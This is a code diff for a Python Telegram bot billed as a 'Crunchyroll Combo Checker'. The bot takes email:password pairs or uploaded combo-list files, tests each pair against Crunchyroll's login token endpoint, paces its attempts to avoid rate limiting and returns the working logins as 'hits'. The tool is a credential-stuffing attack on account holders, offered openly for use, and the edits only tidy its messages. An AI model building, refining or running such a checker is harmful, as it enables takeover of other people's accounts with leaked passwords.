@@ -7,7 +7,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
-# ================== CRUNCHYROLL CHECKER ==================
+
 def crunchyroll_check(username: str, password: str):
     url = "https://beta-api.crunchyroll.com/auth/v1/token"
     
@@ -54,12 +54,11 @@ def crunchyroll_check(username: str, password: str):
         return f"⚠️ Error: {str(e)[:100]}"
 
 
-# ================== TELEGRAM HANDLERS ==================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎉 **Crunchyroll Combo Checker Bot**\n\n"
-        "• Send single combo: `email:password`\n"
-        "• Or upload a `.txt` file with combos (one per line)",
+        "Send: `email:password`\n"
+        "Or upload .txt combo list",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -73,32 +72,32 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"🔍 Checking: `{email}`", parse_mode=ParseMode.MARKDOWN)
             result = crunchyroll_check(email, password)
             await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
-        except Exception:
-            await update.message.reply_text("❌ Wrong format! Use `email:password`")
+        except:
+            await update.message.reply_text("❌ Use format: email:password")
     else:
-        await update.message.reply_text("Send `email:password` or upload a .txt combo file")
+        await update.message.reply_text("Send email:password or upload .txt file")
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     if not document.file_name.lower().endswith('.txt'):
-        await update.message.reply_text("❌ Only .txt files are allowed")
+        await update.message.reply_text("❌ Only .txt files allowed")
         return
 
-    await update.message.reply_text("📂 File received. Processing combos...")
+    await update.message.reply_text("📂 Processing file...")
 
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
         content = file_bytes.decode('utf-8', errors='ignore')
 
-        combos = [line.strip() for line in content.splitlines() if ":" in line and "@" in line and line.strip()]
+        combos = [line.strip() for line in content.splitlines() if ":" in line and "@" in line]
 
         if not combos:
-            await update.message.reply_text("❌ No valid combos found in file.")
+            await update.message.reply_text("No valid combos found.")
             return
 
-        await update.message.reply_text(f"✅ Found {len(combos)} combos. Checking...")
+        await update.message.reply_text(f"Found {len(combos)} combos. Starting check...")
 
         hits = []
         for i, combo in enumerate(combos, 1):
@@ -110,39 +109,37 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 hits.append(combo)
                 await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
             
-            await asyncio.sleep(1.5)  # Prevent rate limiting
+            await asyncio.sleep(1.5)
 
         if hits:
-            hit_list = "\n".join(hits)
             await update.message.reply_text(
-                f"🎯 **CHECK FINISHED**\n\n"
-                f"Total Checked: {len(combos)}\n"
-                f"Hits Found: {len(hits)}\n\n"
-                f"**Hits:**\n{hit_list}",
+                f"🎯 **FINISHED**\nTotal: {len(combos)}\nHits: {len(hits)}\n\n**Hits:**\n" + "\n".join(hits),
                 parse_mode=ParseMode.MARKDOWN
             )
         else:
-            await update.message.reply_text("✅ Check completed.\nNo hits found.")
+            await update.message.reply_text("Check completed. No hits.")
 
     except Exception as e:
-        await update.message.reply_text(f"❌ Error processing file:\n{str(e)[:200]}")
+        await update.message.reply_text(f"File error: {str(e)[:150]}")
 
 
-# ================== MAIN ==================
 def main():
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
     if not TOKEN:
-        print("❌ TELEGRAM_BOT_TOKEN environment variable is not set!")
+        print("TELEGRAM_BOT_TOKEN not set!")
         return
 
     app = Application.builder().token(TOKEN).build()
 
-    # Add handlers (clean, no backslashes)
+    # Clean handlers - no backslash
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_message))
+    
+    text_filter = filters.TEXT & \~filters.COMMAND
+    app.add_handler(MessageHandler(text_filter, handle_message))
+    
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
-    print("🚀 Crunchyroll Checker Bot is running...")
+    print("🚀 Bot is running...")
     app.run_polling()
 
 
